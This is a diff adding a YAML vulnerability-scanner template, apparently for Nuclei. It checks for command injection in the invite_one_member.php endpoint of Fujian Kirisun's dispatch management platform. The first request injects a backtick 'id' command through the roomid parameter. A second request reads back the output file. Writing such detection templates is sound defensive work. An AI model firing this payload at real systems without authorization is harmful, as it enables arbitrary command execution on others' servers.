@@ -1,0 +1,54 @@
+id: kirisun-invite-one-member-php-command-injection
+info:
+  name: 福建科立讯通信 指挥调度管理平台 invite_one_member.php 命令注入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  description: |
+    福建科立讯通信 指挥调度管理平台 invite_one_member.php 存在命令注入漏洞，攻击者可以利用该漏洞执行任意命令。
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: inject-command
+    method: GET
+    path:
+      - "/api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>{{t1}}.txt`"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "id"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+
+  - id: check-command-output
+    method: GET
+    path:
+      - "/api/client/audiobroadcast/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
